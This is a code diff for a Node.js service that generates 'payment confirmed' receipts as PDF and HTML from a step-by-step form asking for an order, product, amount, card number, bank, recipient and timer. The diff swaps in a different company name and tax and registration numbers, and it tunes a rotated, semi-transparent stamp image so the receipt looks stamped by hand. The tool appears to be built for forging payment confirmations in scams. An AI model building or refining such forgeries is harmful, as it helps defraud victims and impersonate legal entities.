@@ -52,18 +52,18 @@ const upload = multer({
   }
 });
 
-// -------------------- memory storage --------------------
+// -------------------- memory --------------------
 const sessions = new Map();
 const history = new Map();
 const orders = new Map();
 
 const STEPS = [
   { key: "order", label: "Введите номер заказа", example: "Например: 5555" },
-  { key: "product", label: "Введите название товара", example: "Например: RTX 5070" },
-  { key: "amount", label: "Введите сумму к оплате", example: "Например: 55000" },
+  { key: "product", label: "Введите название товара", example: "Например: ASUS GeForce RTX 5060 Ti 16GB DUAL OC" },
+  { key: "amount", label: "Введите сумму к оплате", example: "Например: 95400" },
   { key: "card", label: "Введите номер карты", example: "Например: 5555555555555555" },
   { key: "bank", label: "Введите название банка", example: "Например: Озон-Банк" },
-  { key: "recipient", label: "Введите ФИО получателя", example: "Например: Ключко Андрей" },
+  { key: "recipient", label: "Введите ФИО получателя", example: "Например: Иван Иванов" },
   { key: "minutes", label: "Введите время таймера в минутах", example: "Например: 15" }
 ];
 
@@ -254,7 +254,7 @@ function generateConfirmationPdfBuffer(meta) {
         .font("bold")
         .fontSize(14)
         .fillColor("#111")
-        .text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "ОМЕН"', left, y, {
+        .text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "БЕТОН"', left, y, {
           width: contentWidth
         });
 
@@ -263,11 +263,12 @@ function generateConfirmationPdfBuffer(meta) {
         .font("regular")
         .fontSize(10.5)
         .fillColor("#111")
-        .text("ИНН: 7718912655", left, y)
-        .text("ОГРН: 1127747210909", left, y + 18)
-        .text("КПП: 500101001", left, y + 36);
+        .text('Сокращенное наименование: ООО "БЕТОН"', left, y)
+        .text("ИНН: 9726099596", left, y + 18)
+        .text("ОГРН: 1257700249157", left, y + 36)
+        .text("КПП: 772601001", left, y + 54);
 
-      y = 158;
+      y = 178;
       hr(y);
 
       y += 12;
@@ -275,7 +276,7 @@ function generateConfirmationPdfBuffer(meta) {
         .font("bold")
         .fontSize(11.5)
         .fillColor("#111")
-        .text('Чек- ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "ОМЕН"', left, y, {
+        .text('Чек- ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "БЕТОН"', left, y, {
           width: contentWidth
         });
 
@@ -297,34 +298,33 @@ function generateConfirmationPdfBuffer(meta) {
         .font("regular")
         .fontSize(10.5)
         .fillColor("#111")
-        .text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "ОМЕН"', left, y, {
+        .text('ОБЩЕСТВО С ОГРАНИЧЕННОЙ ОТВЕТСТВЕННОСТЬЮ "БЕТОН"', left, y, {
           width: contentWidth,
           align: "center"
         });
 
       y += 22;
-      doc.text("Офис: г. Москва", left, y, {
+      doc.text('Сокращенное наименование: ООО "БЕТОН"', left, y, {
         width: contentWidth,
         align: "center"
       });
 
       y += 18;
       doc
-        .fillColor("#1d4ed8")
-        .text("г. Москва", left, y, {
-          width: contentWidth,
-          align: "center"
-        });
-
-      y += 18;
-      doc
         .fillColor("#111")
-        .text("ИНН 7718912655", left, y, {
+        .text("ИНН 9726099596", left, y, {
           width: contentWidth,
           align: "center"
         });
 
-      y += 30;
+      y += 16;
+      doc
+        .text("КПП 772601001", left, y, {
+          width: contentWidth,
+          align: "center"
+        });
+
+      y += 28;
       stars(y);
 
       // Товар
@@ -446,34 +446,26 @@ function generateConfirmationPdfBuffer(meta) {
       y += 14;
       stars(y);
 
-      // Нижняя печать — только одна
+      // Нижняя печать — чуть вправо и с заходом на строки
       if (fs.existsSync(STAMP_PATH)) {
-  try {
-    const stampSize = 160;
+        try {
+          const stampSize = 128;
+          const stampX = pageWidth / 2 + 55 - stampSize / 2;
+          const stampY = Math.min(y - 8, pageHeight - 190);
 
-    // позиция — чуть правее центра (как в реальных чеках)
-    const stampX = pageWidth / 2 + 40 - stampSize / 2;
-    const stampY = Math.min(y + 10, pageHeight - 200);
-
-    doc.save();
-
-    // прозрачность (как настоящая краска)
-    doc.opacity(0.85);
-
-    // поворот — чтобы выглядело «поставлено рукой»
-    doc.rotate(-12, {
-      origin: [stampX + stampSize / 2, stampY + stampSize / 2]
-    });
-
-    doc.image(STAMP_PATH, stampX, stampY, {
-      fit: [stampSize, stampSize]
-    });
-
-    doc.restore();
-  } catch (e) {
-    console.error("STAMP ERROR:", e);
-  }
-}
+          doc.save();
+          doc.opacity(0.88);
+          doc.rotate(-11, {
+            origin: [stampX + stampSize / 2, stampY + stampSize / 2]
+          });
+          doc.image(STAMP_PATH, stampX, stampY, {
+            fit: [stampSize, stampSize]
+          });
+          doc.restore();
+        } catch (e) {
+          console.error("STAMP ERROR:", e);
+        }
+      }
 
       doc.end();
     } catch (err) {
@@ -509,7 +501,7 @@ function buildReceiptHtml(meta) {
 <body>
   <div class="wrap">
     <div class="card">
-      <div class="title">ОМЕН</div>
+      <div class="title">БЕТОН</div>
       <div class="badge">✔ Оплата подтверждена</div>
 
       <div class="row">
